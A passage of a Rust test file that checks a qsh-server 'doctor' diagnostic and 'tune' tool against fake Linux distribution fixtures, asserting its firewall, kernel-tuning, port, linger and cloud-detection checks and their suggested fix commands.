//! Tests of doctor and tune against the distribution fixtures ([`super::fixtures`]): every
//! check on every distribution, the firewall models, the reports, and tune's plan, apply and
//! revert on an in-memory system (byte for byte).

use serde_json::{json, Value};

use super::checks::{self, Context, DaemonState, HostInfo, User};
use super::client::{diagnose, parse_remote, Probe, Remote};
use super::distro::{Family, OsRelease};
use super::firewall::Ports;
use super::fixtures::{self, distro, Fake, DISTROS};
use super::report::{self, Style};
use super::system::Bind;
use super::tune::{self, Options, Plan, Request, Step};
use super::{Check, Status, System};
use qsh_core::transport::{FailureKind, Transport};

const IDS: &[&str] = &[
    "daemon",
    "ports",
    "firewall",
    "udp-buffers",
    "gso-gro",
    "tcp-bbr",
    "ipv6",
    "mtu",
    "linger",
    "runtime-dir",
    "selinux",
    "apparmor",
    "clock",
    "limits",
    "conntrack",
    "cloud",
    "container",
    "discovery",
];

fn alice() -> User {
    User {
        name: "alice".into(),
        uid: 1000,
        home: "/home/alice".into(),
        sudo: false,
    }
}

fn ctx(daemon: DaemonState) -> Context {
    Context {
        version: "0.5.0".into(),
        exe: Some("/opt/qsh/bin/qsh-server".into()),
        range: 60443..=60542,
        extra_ports: vec![],
        daemon,
        probe: false,
        user: alice(),
    }
}

fn status_json(version: &str, sessions: u64) -> Value {
    json!({"version": version, "pid": 4242, "udp": 60443, "tcp": 60443, "extra_ports": [],
           "cert_sha256": "ab".repeat(32), "session_count": sessions, "can_upgrade": true})
}

fn run(sys: &Fake) -> (HostInfo, Vec<Check>) {
    run_with(sys, &ctx(DaemonState::Running(status_json("0.5.0", 3))))
}

fn run_with(sys: &Fake, c: &Context) -> (HostInfo, Vec<Check>) {
    let host = HostInfo::read(sys);
    let checks = checks::run_all(sys, &host, c);
    (host, checks)
}

fn get<'a>(checks: &'a [Check], id: &str) -> &'a Check {
    checks
        .iter()
        .find(|c| c.id == id)
        .unwrap_or_else(|| panic!("no check {id}"))
}

fn fix_text(c: &Check) -> String {
    c.fix.as_ref().map(|f| f.commands.join(" && ")).unwrap_or_default()
}

// ---------------------------------------------------------------------------------------
// Distributions

#[test]
fn os_release_names_the_family_of_every_supported_distribution() {
    let cases = [
        (
            fixtures::UBUNTU_2404,
            Family::Debian,
            "ubuntu",
            "24.04",
            "Ubuntu 24.04.1 LTS",
        ),
        (
            fixtures::UBUNTU_2004,
            Family::Debian,
            "ubuntu",
            "20.04",
            "Ubuntu 20.04.6 LTS",
        ),
        (
            fixtures::DEBIAN_12,
            Family::Debian,
            "debian",
            "12",
            "Debian GNU/Linux 12 (bookworm)",
        ),
        (
            fixtures::FEDORA_WS,
            Family::Fedora,
            "fedora",
            "41",
            "Fedora Linux 41 (Workstation Edition)",
        ),
        (
            fixtures::ROCKY_9,
            Family::Fedora,
            "rocky",
            "9.4",
            "Rocky Linux 9.4 (Blue Onyx)",
        ),
        (
            fixtures::ALMA_9,
            Family::Fedora,
            "almalinux",
            "9.4",
            "AlmaLinux 9.4 (Seafoam Ocelot)",
        ),
        (
            fixtures::TUMBLEWEED,
            Family::Suse,
            "opensuse-tumbleweed",
            "20241001",
            "openSUSE Tumbleweed",
        ),
        (
            fixtures::LEAP,
            Family::Suse,
            "opensuse-leap",
            "15.6",
            "openSUSE Leap 15.6",
        ),
        (fixtures::ARCH, Family::Arch, "arch", "", "Arch Linux"),
        (
            fixtures::ALPINE,
            Family::Alpine,
            "alpine",
            "3.20.3",
            "Alpine Linux v3.20",
        ),
        // ID_LIKE=fedora, but Amazon Linux has its own column
        (
            fixtures::AMAZON_2023,
            Family::Amazon,
            "amzn",
            "2023",
            "Amazon Linux 2023.6.20241010",
        ),
        (fixtures::VOID, Family::Unknown, "void", "", "Void Linux"),
    ];
    for (text, family, id, version, pretty) in cases {
        let os = OsRelease::parse(text);
        assert_eq!(Family::of(&os), family, "{id}");
        assert_eq!(
            (os.id.as_str(), os.version_id.as_str(), os.pretty_name.as_str()),
            (id, version, pretty)
        );
    }
    // Derivatives through ID_LIKE; quoting and escapes
    let neon = OsRelease::parse("ID=neon\nID_LIKE=\"ubuntu debian\"\nNAME='KDE neon'\nVERSION_ID=\"6.0\"\n");
    assert_eq!(Family::of(&neon), Family::Debian);
    assert_eq!(neon.pretty_name, "KDE neon 6.0");
    assert_eq!(OsRelease::parse("PRETTY_NAME=\"a \\\"b\\\"\"").pretty_name, "a \"b\"");
    assert_eq!(Family::of(&OsRelease::parse("")), Family::Unknown);
    assert_eq!(OsRelease::parse("").pretty_name, "Linux");
}

#[test]
fn every_distribution_runs_every_check_in_order() {
    for name in DISTROS {
        let sys = distro(name);
        let (host, checks) = run(&sys);
        let ids: Vec<&str> = checks.iter().map(|c| c.id).collect();
        assert_eq!(ids, IDS, "{name}");
        // Every problem says what to do
        for c in &checks {
            if c.status >= Status::Warn {
                assert!(c.fix.is_some(), "{name}: {} has no fix: {}", c.id, c.summary);
            }
            assert!(!c.summary.is_empty(), "{name}: {}", c.id);
        }
        // Read only
        assert!(
            sys.ran
                .borrow()
                .iter()
                .all(|c| !c.contains("allow") && !c.contains("--add") && !c.contains("modprobe")),
            "{name}: {:?}",
            sys.ran.borrow()
        );
        assert!(sys.read(tune::RECORD).is_none());
        let json = report::json(&host, &DaemonState::NotRunning, false, &checks);
        assert_eq!(json["doctor"], 1);
        assert_eq!(json["checks"].as_array().unwrap().len(), IDS.len());
    }
}

#[test]
fn the_first_line_describes_the_host() {
    let cases = [
        ("ubuntu-24.04", "Ubuntu 24.04.1 LTS, systemd 255, kernel 6.8.0, KVM"),
        ("alpine", "Alpine Linux v3.20, OpenRC, kernel 6.6.54"),
        (
            "amazon-2023",
            "Amazon Linux 2023.6.20241010, systemd 252, kernel 6.1.112, KVM (Amazon EC2)",
        ),
        (
            "void",
            "Void Linux, kernel 6.6.1_1, unknown distribution: generic fixes",
        ),
    ];
    for (name, want) in cases {
        let host = HostInfo::read(&distro(name));
        assert_eq!(host.describe(), want, "{name}");
    }
    let host = HostInfo::read(&distro("amazon-2023"));
    let j = host.to_json();
    assert_eq!(
        (
            j["os_id"].as_str(),
            j["init"].as_str(),
            j["cloud"].as_str(),
            j["virt"].as_str()
        ),
        (Some("amzn"), Some("systemd"), Some("aws"), Some("kvm"))
    );
    assert_eq!(j["container"], Value::Null);
}

#[test]
fn ubuntu_needs_buffers_and_bbr_allowed() {
    let (_, checks) = run(&distro("ubuntu-24.04"));
    let b = get(&checks, "udp-buffers");
    assert_eq!(b.status, Status::Warn);
    assert_eq!(
        b.summary,
        "net.core.rmem_max is 212992, net.core.wmem_max is 212992; QUIC on long fast paths needs 4194304"
    );
    let fix = b.fix.as_ref().unwrap();
    assert_eq!(fix.tune, Some("udp-buffers"));
    assert_eq!(fix.commands[0], "sudo sysctl -w net.core.rmem_max=4194304");
    let bbr = get(&checks, "tcp-bbr");
    assert_eq!(bbr.status, Status::Warn);
    assert_eq!(
        fix_text(bbr),
        "sudo modprobe tcp_bbr && echo tcp_bbr | sudo tee /etc/modules-load.d/qsh.conf && sudo sysctl -w net.ipv4.tcp_allowed_congestion_control='reno cubic bbr'"
    );
    assert_eq!(
        get(&checks, "firewall").status,
        Status::Ok,
        "ufw is installed but inactive"
    );
    assert_eq!(
        get(&checks, "apparmor").summary,
        "AppArmor enabled; qsh-server is unconfined"
    );
    assert_eq!(get(&checks, "selinux").status, Status::Skip);
    assert_eq!(
        get(&checks, "linger").summary,
        "sessions survive logout (KillUserProcesses=no)"
    );
    assert_eq!(get(&checks, "runtime-dir").status, Status::Ok);
    assert_eq!(get(&checks, "discovery").summary, "qsh HOST finds /usr/bin/qsh-server");
    assert_eq!(
        get(&checks, "daemon").summary,
        "0.5.0 running, UDP+TCP 60443, 3 sessions"
    );
    assert_eq!(
        get(&checks, "ipv6").summary,
        "IPv6 default route on eth0; the daemon listens on IPv4 and IPv6"
    );
    assert_eq!(get(&checks, "mtu").summary, "MTU 1500 on eth0");
    assert_eq!(get(&checks, "gso-gro").status, Status::Ok);
    assert_eq!(get(&checks, "clock").status, Status::Ok);
    assert_eq!(get(&checks, "limits").summary, "up to 524288 open descriptors");
    assert_eq!(get(&checks, "conntrack").summary, "203.0.113.10 is a public address");
}

#[test]
fn bbr_already_allowed_or_default_or_impossible() {
    let sys = distro("debian-12")
        .file(
            "/proc/sys/net/ipv4/tcp_available_congestion_control",
            "reno cubic bbr\n",
        )
        .file("/proc/sys/net/ipv4/tcp_allowed_congestion_control", "reno cubic bbr\n");
    let (_, checks) = run(&sys);
    let c = get(&checks, "tcp-bbr");
    assert_eq!(c.status, Status::Ok);
    assert!(c.summary.starts_with("TLS connections use BBR"), "{}", c.summary);
    let sys = sys
        .file("/proc/sys/net/ipv4/tcp_congestion_control", "bbr\n")
        .file("/proc/sys/net/core/default_qdisc", "fq\n");
    let (_, checks) = run(&sys);
    assert_eq!(
        get(&checks, "tcp-bbr").summary,
        "BBR is the default congestion control (qdisc fq)"
    );
    let sys = distro("arch").no_file("/lib/modules/6.11.3-arch1-1/modules.dep");
    let (_, checks) = run(&sys);
    let c = get(&checks, "tcp-bbr");
    assert_eq!(c.status, Status::Info);
    assert!(
        c.summary.starts_with("this kernel has no tcp_bbr module"),
        "{}",
        c.summary
    );
}

#[test]
fn fedora_workstation_zone_already_allows_the_ports() {
    let (_, checks) = run(&distro("fedora-workstation"));
    let fw = get(&checks, "firewall");
    assert_eq!(fw.status, Status::Ok, "{}", fw.summary);
    assert_eq!(
        fw.summary,
        "firewalld (zone FedoraWorkstation) allows UDP and TCP 60443"
    );
    assert_eq!(fw.facts["zone"], "FedoraWorkstation");
    assert_eq!(
        get(&checks, "selinux").summary,
        "SELinux enforcing; qsh-server runs as unconfined_t"
    );
}

#[test]
fn firewalld_public_zone_gets_the_service_or_the_ports() {
    // Rocky with the packaged service file: the distribution's idiom
    let (_, checks) = run(&distro("rocky-9"));
    let fw = get(&checks, "firewall");
    assert_eq!(fw.status, Status::Fail);
    assert_eq!(
        fw.summary,
        "firewalld (zone public) is active and allows neither UDP nor TCP 60443"
    );
    let fix = fw.fix.as_ref().unwrap();
    assert_eq!(
        fix.commands,
        [
            "sudo firewall-cmd --permanent --zone=public --add-service=qsh",
            "sudo firewall-cmd --reload"
        ]
    );
    assert_eq!(fix.tune, Some("firewall"));
    // Without it: ports
    for name in ["alma-9", "tumbleweed", "leap"] {
        let (_, checks) = run(&distro(name));
        assert_eq!(
            fix_text(get(&checks, "firewall")),
            "sudo firewall-cmd --permanent --zone=public --add-port=60443-60542/udp --add-port=60443-60542/tcp && sudo firewall-cmd --reload",
            "{name}"
        );
    }
    // The service in the zone: open
    let sys = distro("rocky-9").cmd(
        "firewall-cmd --zone=public --list-all",
        0,
        &fixtures::FIREWALLD_PUBLIC.replace("services: cockpit", "services: qsh cockpit"),
    );
    assert_eq!(get(&run(&sys).1, "firewall").status, Status::Ok);
    // Extra ports go with --add-port next to the service
    let mut c = ctx(DaemonState::NotRunning);
    c.extra_ports = vec![443];
    let (_, checks) = run_with(&distro("rocky-9"), &c);
    assert_eq!(
        fix_text(get(&checks, "firewall")),
        "sudo firewall-cmd --permanent --zone=public --add-service=qsh --add-port=443/udp --add-port=443/tcp && sudo firewall-cmd --reload"
    );
}

const UFW_STATUS: &str = "Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed)\nNew profiles: skip\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    Anywhere\n22/tcp (v6)                ALLOW IN    Anywhere (v6)\n";

fn ufw_active(f: Fake) -> Fake {
    f.file("/etc/ufw/ufw.conf", "ENABLED=yes\nLOGLEVEL=low\n")
        .cmd("systemctl is-active ufw", 0, "active\n")
        .cmd("ufw status verbose", 0, UFW_STATUS)
}

#[test]
fn ufw_as_root_and_as_a_user() {
    // A user cannot read ufw's rules: the command to open them, and how to find out
    let (_, checks) = run(&ufw_active(distro("ubuntu-24.04")));
    let fw = get(&checks, "firewall");
    assert_eq!(fw.status, Status::Skip);
    assert_eq!(fw.summary, "ufw is active; only root can read ufw's rules");
    assert_eq!(
        fix_text(fw),
        "sudo ufw allow 60443:60542/udp && sudo ufw allow 60443:60542/tcp"
    );
    // Root reads them
    let (_, checks) = run(&ufw_active(distro("ubuntu-24.04")).root());
    let fw = get(&checks, "firewall");
    assert_eq!(fw.status, Status::Fail);
    assert_eq!(fw.summary, "ufw is active and allows neither UDP nor TCP 60443");
    assert_eq!(
        fix_text(fw),
        "sudo ufw allow 60443:60542/udp && sudo ufw allow 60443:60542/tcp"
    );
    // With the packaged application profile: ufw allow qsh
    let sys = ufw_active(distro("ubuntu-24.04")).root().file(
        "/etc/ufw/applications.d/qsh",
        "[qsh]\ntitle=qsh\ndescription=x\nports=60443:60542/udp|60443:60542/tcp\n",
    );
    assert_eq!(fix_text(get(&run(&sys).1, "firewall")), "sudo ufw allow qsh");
    // The profile's rule lets them in
    let sys = sys.cmd(
        "ufw status verbose",
        0,
        &format!("{UFW_STATUS}qsh                        ALLOW IN    Anywhere\n"),
    );
    assert_eq!(get(&run(&sys).1, "firewall").status, Status::Ok);
    // Only UDP opened: TLS blocked
    let sys = ufw_active(distro("ubuntu-24.04")).root().cmd(
        "ufw status verbose",
        0,
        &format!("{UFW_STATUS}60443:60542/udp            ALLOW IN    Anywhere                   # qsh\n"),
    );
    let fw = get(&run(&sys).1, "firewall").clone();
    assert_eq!(
        (fw.status, fw.summary.as_str()),
        (Status::Fail, "ufw blocks TCP 60443 (TLS)")
    );
}

const NFT_DEBIAN_DROP: &str = r#"{"nftables": [{"metainfo": {"version": "1.0.6", "release_name": "Lester Gooch #5", "json_schema_version": 1}},
{"table": {"family": "inet", "name": "filter", "handle": 1}},
{"chain": {"family": "inet", "table": "filter", "name": "input", "handle": 1, "type": "filter", "hook": "input", "prio": 0, "policy": "drop"}},
{"chain": {"family": "inet", "table": "filter", "name": "forward", "handle": 2, "type": "filter", "hook": "forward", "prio": 0, "policy": "accept"}},
{"rule": {"family": "inet", "table": "filter", "chain": "input", "handle": 4, "expr": [{"match": {"op": "in", "left": {"ct": {"key": "state"}}, "right": ["established", "related"]}}, {"accept": null}]}},
{"rule": {"family": "inet", "table": "filter", "chain": "input", "handle": 5, "expr": [{"match": {"op": "==", "left": {"meta": {"key": "iifname"}}, "right": "lo"}}, {"accept": null}]}},
{"rule": {"family": "inet", "table": "filter", "chain": "input", "handle": 6, "expr": [{"match": {"op": "==", "left": {"payload": {"protocol": "tcp", "field": "dport"}}, "right": 22}}, {"counter": {"packets": 0, "bytes": 0}}, {"accept": null}]}}
]}"#;

#[test]
fn nftables_as_root_drop_policy_and_rules() {
    let base = distro("debian-12")
        .root()
        .cmd("iptables -V", 0, "iptables v1.8.9 (nf_tables)\n");
    let sys = base.clone().cmd("nft -j list ruleset", 0, NFT_DEBIAN_DROP);
    let fw = get(&run(&sys).1, "firewall").clone();
    assert_eq!(fw.status, Status::Fail);
    assert_eq!(fw.summary, "nftables is active and allows neither UDP nor TCP 60443");
    let fix = fw.fix.unwrap();
    assert_eq!(
        fix.commands,
        [
            "sudo nft insert rule inet filter input udp dport 60443-60542 accept",
            "sudo nft insert rule inet filter input tcp dport 60443-60542 accept"
        ]
    );
    assert!(fix.note.unwrap().contains("/etc/nftables.conf"));
    assert_eq!(fix.tune, None, "tune does not change raw rulesets");
    // A rule for the range, in a set with another port, through a jump: open
    let open = NFT_DEBIAN_DROP.replace(
        "\n]}",
        r#",
{"chain": {"family": "inet", "table": "filter", "name": "qsh", "handle": 3}},
{"rule": {"family": "inet", "table": "filter", "chain": "input", "handle": 7, "expr": [{"jump": {"target": "qsh"}}]}},
{"rule": {"family": "inet", "table": "filter", "chain": "qsh", "handle": 8, "expr": [{"match": {"op": "==", "left": {"meta": {"key": "l4proto"}}, "right": {"set": ["udp", "tcp"]}}}, {"match": {"op": "==", "left": {"payload": {"protocol": "th", "field": "dport"}}, "right": {"set": [443, {"range": [60443, 60542]}]}}}, {"accept": null}]}}
]}"#,
    );
    let sys = base.clone().cmd("nft -j list ruleset", 0, &open);
    assert_eq!(get(&run(&sys).1, "firewall").status, Status::Ok);
    // Fedora's style: a vmap on ct state, then a reject at the end of an accept chain
    let fedora = r#"{"nftables": [{"chain": {"family": "inet", "table": "t", "name": "in", "type": "filter", "hook": "input", "prio": 0, "policy": "accept"}},
{"rule": {"family": "inet", "table": "t", "chain": "in", "expr": [{"vmap": {"key": {"ct": {"key": "state"}}, "data": {"set": [["established", {"accept": null}], ["related", {"accept": null}], ["invalid", {"drop": null}]]}}}]}},
{"rule": {"family": "inet", "table": "t", "chain": "in", "expr": [{"match": {"op": "==", "left": {"payload": {"protocol": "udp", "field": "dport"}}, "right": {"range": [60443, 60542]}}}, {"accept": null}]}},
{"rule": {"family": "inet", "table": "t", "chain": "in", "expr": [{"reject": null}]}}]}"#;
    let sys = base.clone().cmd("nft -j list ruleset", 0, fedora);
    let fw = get(&run(&sys).1, "firewall").clone();
    assert_eq!(
        (fw.status, fw.summary.as_str()),
        (Status::Fail, "nftables blocks TCP 60443 (TLS)")
    );
    assert_eq!(
        fw.fix.unwrap().commands[0],
        "sudo nft insert rule inet t in udp dport 60443-60542 accept"
    );
    // An empty ruleset is no firewall
    let sys = base.cmd("nft -j list ruleset", 0, r#"{"nftables": [{"metainfo": {}}]}"#);
    assert_eq!(get(&run(&sys).1, "firewall").summary, "no host firewall found");
}

const IPTABLES_RHEL: &str = "-P INPUT ACCEPT\n-P FORWARD ACCEPT\n-P OUTPUT ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -j ACCEPT\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT\n-A INPUT -j REJECT --reject-with icmp-host-prohibited\n";

#[test]
fn iptables_legacy_as_root() {
    let base = distro("amazon-2023")
        .root()
        .cmd("iptables -V", 0, "iptables v1.8.4 (legacy)\n");
    let sys = base
        .clone()
        .cmd("iptables -S", 0, IPTABLES_RHEL)
        .cmd("ip6tables -S", 0, "-P INPUT ACCEPT\n");
    let fw = get(&run(&sys).1, "firewall").clone();
    assert_eq!(fw.status, Status::Fail);
    assert_eq!(
        fw.summary,
        "iptables (legacy) is active and allows neither UDP nor TCP 60443"
    );
    let fix = fw.fix.unwrap();
    assert_eq!(
        fix.commands[0],
        "sudo iptables -I INPUT -p udp --dport 60443:60542 -j ACCEPT"
    );
    assert_eq!(
        fix.commands[3],
        "sudo ip6tables -I INPUT -p tcp --dport 60443:60542 -j ACCEPT"
    );
    assert_eq!(fix.note.as_deref(), Some(Family::Amazon.iptables_persistence()));
    // Accepted before the reject, by multiport and by a user chain
    let open = IPTABLES_RHEL.replace(
        "-A INPUT -j REJECT",
        "-N QSH\n-A QSH -p udp -m multiport --dports 443,60443:60542 -m comment --comment \"qsh ports\" -j ACCEPT\n-A QSH -p tcp --dport 60443:60542 -j ACCEPT\n-A INPUT -j QSH\n-A INPUT -j REJECT",
    );
    let sys = base
        .clone()
        .cmd("iptables -S", 0, &open)
        .cmd("ip6tables -S", 0, "-P INPUT ACCEPT\n");
    assert_eq!(get(&run(&sys).1, "firewall").status, Status::Ok);
    // A source restriction is not "everyone"
    let some = IPTABLES_RHEL.replace(
        "-A INPUT -j REJECT",
        "-A INPUT -s 10.0.0.0/8 -p udp --dport 60443:60542 -j ACCEPT\n-A INPUT -j REJECT",
    );
    let sys = base.cmd("iptables -S", 0, &some).cmd("ip6tables -S", 0, "");
    assert_eq!(get(&run(&sys).1, "firewall").status, Status::Fail);
}

#[test]
fn raw_rules_without_root_are_a_skip_with_the_command() {
    let sys = distro("debian-12").cmd("systemctl is-enabled nftables", 0, "enabled\n");
    let fw = get(&run(&sys).1, "firewall").clone();
    assert_eq!(fw.status, Status::Skip);
    assert_eq!(
        fw.summary,
        "nftables (service enabled) is active; only root can read the nftables rules"
    );
    assert!(fix_text(&fw).starts_with("sudo nft insert rule inet filter input udp dport"));
    // OpenRC: the runlevels
    let sys = distro("alpine").file("/etc/runlevels/default/iptables", "");
    let fw = get(&run(&sys).1, "firewall").clone();
    assert_eq!(fw.status, Status::Skip);
    assert!(fix_text(&fw).starts_with("sudo iptables -I INPUT"), "{}", fix_text(&fw));
}

#[test]
fn extra_ports_blocked_are_a_warning() {
    let mut c = ctx(DaemonState::NotRunning);
    c.extra_ports = vec![443];
    let sys = ufw_active(distro("ubuntu-24.04")).root().cmd(
        "ufw status verbose",
        0,
        &format!("{UFW_STATUS}60443:60542/udp ALLOW IN Anywhere\n60443:60542/tcp ALLOW IN Anywhere\n"),
    );
    let fw = get(&run_with(&sys, &c).1, "firewall").clone();
    assert_eq!(fw.status, Status::Warn);
    assert_eq!(fw.summary, "ufw allows UDP and TCP 60443; not the extra ports 443");
    assert_eq!(
        fix_text(&fw),
        "sudo ufw allow 60443:60542/udp && sudo ufw allow 60443:60542/tcp && sudo ufw allow 443"
    );
}

#[test]
fn ports_free_taken_and_privileged() {
    let mut sys = distro("debian-12");
    sys.binds.insert((60443, true), Bind::InUse);
    let (_, checks) = run_with(&sys, &ctx(DaemonState::NotRunning));
    assert_eq!(
        get(&checks, "ports").summary,
        "60444 is free on UDP and TCP (range 60443-60542)"
    );
    // Nothing free at all
    let mut c = ctx(DaemonState::NotRunning);
    c.range = 60443..=60443;
    let p = get(&run_with(&sys, &c).1, "ports").clone();
    assert_eq!(p.status, Status::Fail);
    assert!(fix_text(&p).contains("[server]"));
    // Extra port 443 below ip_unprivileged_port_start, extra 8443 taken by a web server
    let mut sys = distro("debian-12")
        .file(
            "/proc/net/tcp",
            "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n   0: 00000000:20FB 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 1 1 0\n",
        )
        .file("/etc/passwd", "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n");
    sys.binds.insert((443, true), Bind::Denied);
    sys.binds.insert((443, false), Bind::Denied);
    sys.binds.insert((8443, false), Bind::InUse);
    let mut c = ctx(DaemonState::Running(status_json("0.5.0", 0)));
    c.extra_ports = vec![443, 8443];
    let p = get(&run_with(&sys, &c).1, "ports").clone();
    assert_eq!(p.status, Status::Warn);
    assert_eq!(
        p.summary,
        "the daemon holds UDP+TCP 60443; extra port 443 is below ip_unprivileged_port_start; extra port 8443/tcp is held by a program of www-data"
    );
    let fix = p.fix.clone().unwrap();
    assert_eq!(fix.tune, Some("low-ports"));
    assert_eq!(fix.tune_flags, ["--allow-low-ports=443"]);
    assert!(fix.note.unwrap().contains("single-user host only"));
    let line = report::check_lines(&p, &Style::PLAIN, 15);
    assert!(
        line.contains("fix: sudo qsh-server tune --apply --allow-low-ports=443\n"),
        "{line}"
    );
}

#[test]
fn the_daemon_older_newer_absent_or_out_of_reach() {
    let (_, checks) = run_with(&distro("arch"), &ctx(DaemonState::Running(status_json("0.4.0", 1))));
    let d = get(&checks, "daemon");
    assert_eq!(d.status, Status::Info);
    assert_eq!(
        d.summary,
        "0.4.0 running (this is 0.5.0), 1 session: replaced in place at the next qsh login"
    );
    let mut old = status_json("0.2.0", 2);
    old["can_upgrade"] = Value::Null;
    let d = get(&run_with(&distro("arch"), &ctx(DaemonState::Running(old))).1, "daemon").clone();
    assert!(d.summary.contains("cannot upgrade in place"), "{}", d.summary);
    assert_eq!(fix_text(&d), "qsh-server stop");
    let d = get(
        &run_with(&distro("arch"), &ctx(DaemonState::Running(status_json("0.6.1", 0)))).1,
        "daemon",
    )
    .clone();
    assert!(d.summary.contains("newer than this qsh-server"), "{}", d.summary);
    let d = get(&run_with(&distro("arch"), &ctx(DaemonState::NotRunning)).1, "daemon").clone();
    assert_eq!(d.status, Status::Info);
    let mut c = ctx(DaemonState::Unreachable("root cannot ask alice's daemon".into()));
    c.user.sudo = true;
    let d = get(&run_with(&distro("arch"), &c).1, "daemon").clone();
    assert_eq!(d.status, Status::Skip);
    // The JSON daemon object: ports and certificate only with --probe
    let s = DaemonState::Running(status_json("0.5.0", 3));
    assert_eq!(report::daemon_json(&s, false)["cert_sha256"], Value::Null);
    let probe = report::daemon_json(&s, true);
    assert_eq!(
        (probe["udp"].as_u64(), probe["cert_sha256"].as_str().map(str::len)),
        (Some(60443), Some(64))
    );
}

#[test]
fn linger_follows_logind_and_its_drop_ins() {
    // KillUserProcesses=yes in a drop-in, overriding the main file
    let sys = distro("debian-12").file(
        "/etc/systemd/logind.conf.d/50-kill.conf",
        "[Login]\nKillUserProcesses=yes\n",
    );
    let l = get(&run(&sys).1, "linger").clone();
    assert_eq!(l.status, Status::Warn);
    assert_eq!(l.summary, "sessions end when you log out (KillUserProcesses=yes)");
    assert_eq!(
        fix_text(&l),
        "sudo loginctl enable-linger alice && systemctl --user enable --now qsh-server"
    );
    assert_eq!(l.fix.as_ref().unwrap().tune, Some("linger"));
    // A later drop-in turns it off again
    let off = distro("debian-12")
        .file(
            "/etc/systemd/logind.conf.d/50-kill.conf",
            "[Login]\nKillUserProcesses=yes\n",
        )
        .file(
            "/etc/systemd/logind.conf.d/90-keep.conf",
            "[Login]\nKillUserProcesses=no\n",
        );
    assert_eq!(get(&run(&off).1, "linger").status, Status::Ok);
    // Lingering, and the daemon in the user unit: fine
    let ok = sys.file("/var/lib/systemd/linger/alice", "").file(
        "/proc/4242/cgroup",
        "0::/user.slice/user-1000.slice/user@1000.service/app.slice/qsh-server.service\n",
    );
    assert_eq!(
        get(&run(&ok).1, "linger").summary,
        "sessions survive logout: lingering, the daemon runs from the user unit"
    );
    // Lingering, but the daemon in a login session's scope dies with it
    let scope = ok.file("/proc/4242/cgroup", "0::/user.slice/user-1000.slice/session-3.scope\n");
    let l = get(&run(&scope).1, "linger").clone();
    assert_eq!(l.status, Status::Warn);
    assert_eq!(fix_text(&l), "systemctl --user enable --now qsh-server");
    assert_eq!(l.fix.unwrap().tune, None);
    // OpenRC: the per-user script
    let l = get(&run(&distro("alpine")).1, "linger").clone();
    assert_eq!(l.status, Status::Info);
    assert_eq!(
        fix_text(&l),
        "sudo ln -s qsh-server /etc/init.d/qsh-server.alice && sudo rc-update add qsh-server.alice default"
    );
}

#[test]
fn runtime_directory_per_distribution() {
    let r = get(&run(&distro("alpine")).1, "runtime-dir").clone();
    assert_eq!(r.status, Status::Info);
    assert_eq!(r.summary, "XDG_RUNTIME_DIR is unset: qsh uses /tmp/qsh-1000");
    assert!(r.fix.unwrap().note.unwrap().contains("elogind or pam_rundir"));
    let r = get(&run(&distro("debian-12").env("XDG_RUNTIME_DIR", "")).1, "runtime-dir").clone();
    assert!(r.fix.unwrap().note.unwrap().contains("pam_systemd"));
    let shared = distro("debian-12")
        .env("XDG_RUNTIME_DIR", "/tmp")
        .meta("/tmp", 0, 0o1777, true);
    let r = get(&run(&shared).1, "runtime-dir").clone();
    assert_eq!(r.status, Status::Warn);
    assert!(r.summary.contains("owner 0, mode 1777"), "{}", r.summary);
}

#[test]
fn clouds_from_dmi_only() {
    let cases = [
        ("sys_vendor", "Google", "product_name", "Google Compute Engine", "gcp"),
        (
            "sys_vendor",
            "Microsoft Corporation",
            "chassis_asset_tag",
            "7783-7084-3265-9085-8269-3286-77",
            "azure",
        ),
        (
            "sys_vendor",
            "Alibaba Cloud",
            "product_name",
            "Alibaba Cloud ECS",
            "alibaba",
        ),
        ("sys_vendor", "Tencent Cloud", "product_name", "CVM", "tencent"),
        ("sys_vendor", "QEMU", "chassis_asset_tag", "OracleCloud.com", "oracle"),
        ("sys_vendor", "Hetzner", "product_name", "vServer", "hetzner"),
        ("sys_vendor", "DigitalOcean", "product_name", "Droplet", "digitalocean"),
    ];
    for (f1, v1, f2, v2, id) in cases {
        let sys = distro("debian-12")
            .file(&format!("/sys/class/dmi/id/{f1}"), v1)
            .file(&format!("/sys/class/dmi/id/{f2}"), v2);
        assert_eq!(checks::cloud(&sys).map(|c| c.id), Some(id));
    }
    assert_eq!(checks::cloud(&distro("debian-12")), None);
    let c = get(&run(&distro("amazon-2023")).1, "cloud").clone();
    assert_eq!(
        c.summary,
        "Amazon EC2: the instance's security group must allow inbound UDP and TCP 60443-60542; this host cannot see it (try qsh doctor HOST from your client)"
    );
    let mut cx = ctx(DaemonState::NotRunning);
    cx.extra_ports = vec![443];
    let c = get(&run_with(&distro("amazon-2023"), &cx).1, "cloud").clone();
    assert!(c.summary.contains("UDP and TCP 60443-60542 and 443;"), "{}", c.summary);
    // Behind the provider's NAT: the conntrack line points to the cloud line
    let mut sys = distro("amazon-2023");
    sys.source = Some("172.31.5.9".parse().unwrap());
    assert!(get(&run(&sys).1, "conntrack").summary.contains("provider's NAT"));
    let mut sys = distro("debian-12");
    sys.source = Some("192.168.1.20".parse().unwrap());
    assert_eq!(
        get(&run(&sys).1, "conntrack").summary,
        "192.168.1.20 is private: clients outside reach this host only if the router forwards UDP and TCP 60443-60542"
    );
}

#[test]
fn containers_leave_host_settings_to_the_host() {
    let sys = distro("debian-12").file("/.dockerenv", "");
    let (host, checks) = run(&sys);
    assert_eq!(host.container.as_deref(), Some("docker"));
    let c = get(&checks, "container");
    assert_eq!(c.status, Status::Info);
    assert_eq!(fix_text(c), "docker run -p 60443:60443/udp -p 60443:60443/tcp …");
    let b = get(&checks, "udp-buffers");
    assert_eq!(b.status, Status::Info);
    assert_eq!(b.fix.as_ref().unwrap().tune, None);
    assert_eq!(
        checks::container(&distro("arch").file("/run/.containerenv", "")).as_deref(),
        Some("podman")
    );
    assert_eq!(
        checks::container(&distro("arch").file("/run/systemd/container", "lxc\n")).as_deref(),
        Some("lxc")
    );
    let wsl = distro("ubuntu-24.04").file("/proc/sys/kernel/osrelease", "5.15.153.1-microsoft-standard-WSL2\n");
    assert_eq!(checks::container(&wsl).as_deref(), Some("wsl"));
